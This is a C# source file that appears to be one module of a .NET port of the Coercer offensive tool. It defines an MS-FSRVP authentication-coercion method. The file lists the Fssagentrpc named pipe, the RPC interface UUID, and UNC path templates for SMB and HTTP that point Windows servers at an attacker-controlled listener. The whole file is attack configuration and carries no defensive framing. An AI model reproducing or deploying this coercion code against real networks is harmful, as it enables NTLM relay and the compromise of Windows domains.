using Coercer_dotnet.structures;

namespace Coercer_dotnet.methods.MS_FSRVP
{
    public abstract class MS_FSRVP : Method
    {
        public override string Author => "@topotam77";
        public override ExploitPath[] ExploitPaths => new ExploitPath[]
        {
            new(AuthType.SMB, "\\\\{{listener}}\x00"),
            new(AuthType.HTTP, "\\\\{{listener}}@{{port}}/{{3}}\x00")
        };
        public override NcanNpAccess[] NcanNpAccesses => new NcanNpAccess[] { new("\\PIPE\\Fssagentrpc", "a8e0653c-2744-4389-a61d-7373df8b2292", "1.0") };
        public override NcacnIpTcpAccess[] NcacnIpTcpAccesses => new NcacnIpTcpAccess[] { new("a8e0653c-2744-4389-a61d-7373df8b2292", "1.0") };
        public override Protocol Protocol => new("[MS-FSRVP]: File Server Remote VSS Protocol", "MS-FSRVP");
    }
}